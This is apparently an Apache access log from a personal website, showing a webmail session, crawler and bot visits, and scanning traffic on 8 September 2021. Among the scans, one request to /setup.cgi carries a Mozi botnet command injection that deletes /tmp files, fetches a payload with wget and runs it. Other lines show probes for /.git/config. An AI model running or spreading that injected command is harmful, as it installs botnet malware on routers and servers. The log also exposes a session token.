73.107.144.246 - - [08/Sep/2021:17:06:34 +0000] "GET /roundcube/skins/larry/styles.min.css?s=1630932658 HTTP/1.1" 200 9944 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:34 +0000] "GET /roundcube/skins/larry/ui.js?s=1630931984 HTTP/1.1" 200 13095 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:34 +0000] "GET /roundcube/program/js/jquery.min.js?s=1630932403 HTTP/1.1" 200 32059 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:34 +0000] "GET /roundcube/program/js/jstz.min.js?s=1630932403 HTTP/1.1" 200 5365 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:34 +0000] "GET /roundcube/program/js/app.js?s=1630931984 HTTP/1.1" 200 79246 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:34 +0000] "GET /roundcube/plugins/jqueryui/js/jquery-ui.min.js?s=1630931984 HTTP/1.1" 200 70060 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:34 +0000] "GET /roundcube/program/js/common.js?s=1630931984 HTTP/1.1" 200 8010 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:37 +0000] "GET /roundcube/skins/larry/images/favicon.ico?s=1630931984 HTTP/1.1" 200 2046 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:38 +0000] "GET /roundcube/skins/larry/images/messages.png?v=72e9.1264 HTTP/1.1" 200 1624 "http://www.plemma.cc/roundcube/skins/larry/styles.min.css?s=1630932658" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:38 +0000] "GET /roundcube/skins/larry/images/buttons.png HTTP/1.1" 200 13336 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:38 +0000] "GET /roundcube/skins/larry/images/addcontact.png HTTP/1.1" 200 622 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:38 +0000] "GET /roundcube/skins/larry/images/filetypes.png HTTP/1.1" 200 5079 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:38 +0000] "GET /roundcube/skins/larry/images/listicons.png HTTP/1.1" 200 11037 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:06:38 +0000] "GET /roundcube/skins/larry/images/watermark.jpg HTTP/1.1" 200 4810 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
::1 - - [08/Sep/2021:17:06:41 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
52.224.245.245 - - [08/Sep/2021:17:09:01 +0000] "GET /.git/config HTTP/1.1" 200 524 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
35.227.62.178 - - [08/Sep/2021:17:09:02 +0000] "GET /.git/config HTTP/1.1" 200 468 "-" "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"
54.149.90.90 - - [08/Sep/2021:17:09:05 +0000] "GET / HTTP/1.1" 200 15426 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.149.90.90 - - [08/Sep/2021:17:09:06 +0000] "GET /css/variables.css HTTP/1.1" 200 1499 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.149.90.90 - - [08/Sep/2021:17:09:06 +0000] "GET /css/general.css HTTP/1.1" 200 1859 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.149.90.90 - - [08/Sep/2021:17:09:06 +0000] "GET /css/chrome.css HTTP/1.1" 200 2692 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.149.90.90 - - [08/Sep/2021:17:09:06 +0000] "GET /FontAwesome/css/font-awesome.css HTTP/1.1" 404 488 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.149.90.90 - - [08/Sep/2021:17:09:06 +0000] "GET /fonts/fonts.css HTTP/1.1" 404 488 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.149.90.90 - - [08/Sep/2021:17:09:06 +0000] "GET /highlight.css HTTP/1.1" 404 488 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.149.90.90 - - [08/Sep/2021:17:09:06 +0000] "GET /tomorrow-night.css HTTP/1.1" 404 487 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.149.90.90 - - [08/Sep/2021:17:09:06 +0000] "GET /ayu-highlight.css HTTP/1.1" 404 487 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.149.90.90 - - [08/Sep/2021:17:09:06 +0000] "GET /xcaliber.dao.jpg HTTP/1.1" 200 14201 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.149.90.90 - - [08/Sep/2021:17:09:06 +0000] "GET /css/print.css HTTP/1.1" 200 734 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.149.90.90 - - [08/Sep/2021:17:09:06 +0000] "GET /usedjolie.png HTTP/1.1" 200 373194 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.149.90.90 - - [08/Sep/2021:17:09:08 +0000] "GET /favicon.png HTTP/1.1" 404 487 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.149.90.90 - - [08/Sep/2021:17:09:09 +0000] "GET /favicon.svg HTTP/1.1" 404 487 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
::1 - - [08/Sep/2021:17:09:16 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.38 (Debian) (internal dummy connection)"
54.149.90.90 - - [08/Sep/2021:17:09:31 +0000] "GET /rsync HTTP/1.1" 404 488 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.149.90.90 - - [08/Sep/2021:17:09:31 +0000] "GET /favicon.ico HTTP/1.1" 404 487 "http://plemma.cc/rsync" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36"
54.36.148.234 - - [08/Sep/2021:17:09:33 +0000] "GET / HTTP/1.1" 200 15370 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.149.90.90 - - [08/Sep/2021:17:10:22 +0000] "-" 408 0 "-" "-"
199.16.157.180 - - [08/Sep/2021:17:19:51 +0000] "GET /rsync HTTP/1.1" 404 432 "-" "Twitterbot/1.0"
199.16.157.183 - - [08/Sep/2021:17:22:01 +0000] "GET /rsync HTTP/1.1" 404 432 "-" "Twitterbot/1.0"
34.233.58.209 - - [08/Sep/2021:17:22:01 +0000] "HEAD /rsync HTTP/1.1" 404 140 "-" "help@dataminr.com"
34.233.208.215 - - [08/Sep/2021:17:22:01 +0000] "HEAD /rsync HTTP/1.1" 404 140 "-" "help@dataminr.com"
192.133.77.17 - - [08/Sep/2021:17:22:16 +0000] "GET /rsync HTTP/1.1" 404 432 "-" "Twitterbot/1.0"
3.218.77.26 - - [08/Sep/2021:17:22:16 +0000] "GET /robots.txt HTTP/1.1" 404 432 "-" "Mozilla/5.0 (compatible; ia_archiver/1.0; +http://www.alexa.com/help/webmasters; crawler@alexa.com)"
3.218.77.26 - - [08/Sep/2021:17:22:16 +0000] "GET /rsync HTTP/1.1" 404 432 "-" "Mozilla/5.0 (compatible; ia_archiver/1.0; +http://www.alexa.com/help/webmasters; crawler@alexa.com)"
88.99.195.198 - - [08/Sep/2021:17:22:24 +0000] "GET /robots.txt HTTP/1.1" 404 451 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090914 Slackware/13.0_stable Firefox/50.0"
213.239.218.163 - - [08/Sep/2021:17:22:24 +0000] "HEAD /rsync HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; um-LN/1.0; mailto: techinfo@ubermetrics-technologies.com; Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
88.99.195.198 - - [08/Sep/2021:17:22:24 +0000] "GET /rsync HTTP/1.1" 404 451 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090914 Slackware/13.0_stable Firefox/50.0"
73.107.144.246 - - [08/Sep/2021:17:22:32 +0000] "GET /roundcube/?_task=mail&_mbox=INBOX HTTP/1.1" 200 2707 "http://www.plemma.cc/roundcube/?_task=mail&_refresh=1&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:22:34 +0000] "GET /roundcube/program/js/app.js?s=1630931984 HTTP/1.1" 200 79246 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:22:34 +0000] "GET /roundcube/plugins/jqueryui/js/jquery-ui.min.js?s=1630931984 HTTP/1.1" 200 70060 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
51.210.36.36 - - [08/Sep/2021:17:22:46 +0000] "GET /rsync HTTP/1.1" 404 488 "-" "Mozilla/5.0 (compatible; PaperLiBot/2.1; https://support.paper.li/hc/en-us/articles/360006695637-PaperLiBot)"
199.16.157.180 - - [08/Sep/2021:17:23:01 +0000] "GET /rsync HTTP/1.1" 404 432 "-" "Twitterbot/1.0"
35.247.89.162 - - [08/Sep/2021:17:23:07 +0000] "HEAD /rsync HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
35.247.89.162 - - [08/Sep/2021:17:23:07 +0000] "HEAD /rsync HTTP/1.1" 404 140 "-" "-"
35.247.89.162 - - [08/Sep/2021:17:23:07 +0000] "HEAD /rsync HTTP/1.1" 404 140 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1"
109.248.6.94 - - [08/Sep/2021:17:24:16 +0000] "POST /recv4.php HTTP/1.1" 404 432 "-" "WebMonitor Client"
88.99.142.101 - - [08/Sep/2021:17:24:17 +0000] "GET /robots.txt HTTP/1.1" 404 432 "-" "Mozilla/5.0 (compatible; Semanticbot/1.0; +http://sempi.tech/bot.html)"
88.99.142.101 - - [08/Sep/2021:17:24:17 +0000] "GET /rsync HTTP/1.1" 404 432 "http://plemma.cc/" "Mozilla/5.0 (compatible; Semanticbot/1.0; +http://sempi.tech/bot.html)"
204.101.161.19 - - [08/Sep/2021:17:32:58 +0000] "GET /aaa9 HTTP/1.1" 404 493 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
54.225.49.20 - - [08/Sep/2021:17:43:13 +0000] "GET / HTTP/1.1" 200 15426 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
54.225.49.20 - - [08/Sep/2021:17:43:13 +0000] "GET / HTTP/1.1" 200 15425 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4"
73.107.144.246 - - [08/Sep/2021:17:50:12 +0000] "GET /roundcube/?_task=mail&_mbox=INBOX HTTP/1.1" 200 2705 "http://www.plemma.cc/roundcube/?_task=mail&_refresh=1&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:50:14 +0000] "GET /roundcube/program/js/app.js?s=1630931984 HTTP/1.1" 200 79245 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:50:19 +0000] "GET /roundcube/plugins/jqueryui/js/jquery-ui.min.js?s=1630931984 HTTP/1.1" 200 70060 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:50:54 +0000] "POST /roundcube/?_task=login HTTP/1.1" 302 773 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:50:54 +0000] "GET /roundcube/?_task=mail&_mbox=INBOX&_token=CAZt88t1qNjtuDBaBIo76W4uS6P4lDNl HTTP/1.1" 200 9162 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:50:55 +0000] "GET /roundcube/program/js/list.js?s=1630931984 HTTP/1.1" 200 13011 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX&_token=CAZt88t1qNjtuDBaBIo76W4uS6P4lDNl" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:50:55 +0000] "GET /roundcube/skins/larry/mail.min.css?s=1630932658 HTTP/1.1" 200 5139 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX&_token=CAZt88t1qNjtuDBaBIo76W4uS6P4lDNl" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:50:56 +0000] "GET /roundcube/skins/larry/images/buttons.png?v=2e08.13608 HTTP/1.1" 200 13336 "http://www.plemma.cc/roundcube/skins/larry/styles.min.css?s=1630932658" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:50:56 +0000] "GET /roundcube/skins/larry/images/listicons.png?v=ce39.10766 HTTP/1.1" 200 11037 "http://www.plemma.cc/roundcube/skins/larry/styles.min.css?s=1630932658" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:50:56 +0000] "GET /roundcube/?_task=mail&_action=getunread&_page=1&_remote=1&_unlock=0&_=1631123455157 HTTP/1.1" 200 653 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:50:56 +0000] "GET /roundcube/?_task=mail&_action=list&_refresh=1&_layout=widescreen&_mbox=INBOX&_page=&_remote=1&_unlock=loading1631123455690&_=1631123455156 HTTP/1.1" 200 4101 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX&_token=CAZt88t1qNjtuDBaBIo76W4uS6P4lDNl" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:51:02 +0000] "GET /roundcube/?_task=mail&_caps=pdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&_uid=847&_mbox=INBOX&_framed=1&_action=preview HTTP/1.1" 200 4256 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:51:02 +0000] "GET /roundcube/?_task=addressbook&_action=photo&_email=info%40youzim.it HTTP/1.1" 200 456 "http://www.plemma.cc/roundcube/?_task=mail&_caps=pdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&_uid=847&_mbox=INBOX&_framed=1&_action=preview" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:51:03 +0000] "GET /roundcube/skins/larry/images/contactpic_32px.png?v=ee80.246 HTTP/1.1" 200 604 "http://www.plemma.cc/roundcube/skins/larry/mail.min.css?s=1630932658" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
207.102.138.19 - - [08/Sep/2021:17:51:44 +0000] "GET /aaa9 HTTP/1.1" 404 493 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:51:58 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 691 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:52:57 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 682 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:17:53:58 +0000] "POST /roundcube/?_task=mail&_action=refresh HTTP/1.1" 200 681 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
207.102.138.19 - - [08/Sep/2021:18:04:59 +0000] "GET /aaa9 HTTP/1.1" 404 493 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:18:12:11 +0000] "GET /roundcube/?_task=mail&_mbox=INBOX HTTP/1.1" 200 2707 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:18:12:12 +0000] "GET /roundcube/plugins/jqueryui/js/jquery-ui.min.js?s=1630931984 HTTP/1.1" 200 70060 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:18:12:12 +0000] "GET /roundcube/program/js/app.js?s=1630931984 HTTP/1.1" 200 79245 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
110.154.244.207 - - [08/Sep/2021:18:14:24 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 451 "-" "-"
73.107.144.246 - - [08/Sep/2021:18:23:16 +0000] "GET /roundcube/?_task=mail&_mbox=INBOX HTTP/1.1" 200 2707 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:18:23:17 +0000] "GET /roundcube/plugins/jqueryui/js/jquery-ui.min.js?s=1630931984 HTTP/1.1" 200 70060 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
73.107.144.246 - - [08/Sep/2021:18:23:17 +0000] "GET /roundcube/program/js/app.js?s=1630931984 HTTP/1.1" 200 79246 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
51.6.142.68 - - [08/Sep/2021:18:30:37 +0000] "GET /xcaliber.dao.jpg HTTP/1.1" 200 14202 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
51.6.142.68 - - [08/Sep/2021:18:30:37 +0000] "GET /usedjolie.png HTTP/1.1" 200 373195 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
73.107.144.246 - - [08/Sep/2021:18:33:32 +0000] "GET /roundcube/?_task=mail&_mbox=INBOX HTTP/1.1" 200 2706 "http://www.plemma.cc/roundcube/?_task=mail&_mbox=INBOX" "Mozilla/5.0 (X11; CrOS x86_64 13982.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.162 Safari/537.36"
199.19.224.165 - - [08/Sep/2021:18:36:38 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 456 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
207.102.138.19 - - [08/Sep/2021:18:45:40 +0000] "GET /aaa9 HTTP/1.1" 404 493 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
40.94.20.43 - - [08/Sep/2021:18:47:25 +0000] "GET /rsync HTTP/1.1" 404 488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
40.94.20.52 - - [08/Sep/2021:18:47:29 +0000] "GET / HTTP/1.1" 200 15426 "https://t.co/t42i5t8hJC?amp=1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
40.94.20.52 - - [08/Sep/2021:18:47:30 +0000] "GET /css/variables.css HTTP/1.1" 200 1498 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
40.94.20.18 - - [08/Sep/2021:18:47:30 +0000] "GET /css/general.css HTTP/1.1" 200 1860 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
40.94.20.30 - - [08/Sep/2021:18:47:31 +0000] "GET /fonts/fonts.css HTTP/1.1" 404 488 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
40.94.20.51 - - [08/Sep/2021:18:47:31 +0000] "GET /FontAwesome/css/font-awesome.css HTTP/1.1" 404 488 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
40.94.20.52 - - [08/Sep/2021:18:47:31 +0000] "GET /css/chrome.css HTTP/1.1" 200 2691 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
40.94.20.32 - - [08/Sep/2021:18:47:31 +0000] "GET /tomorrow-night.css HTTP/1.1" 404 488 "http://plemma.cc/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36"
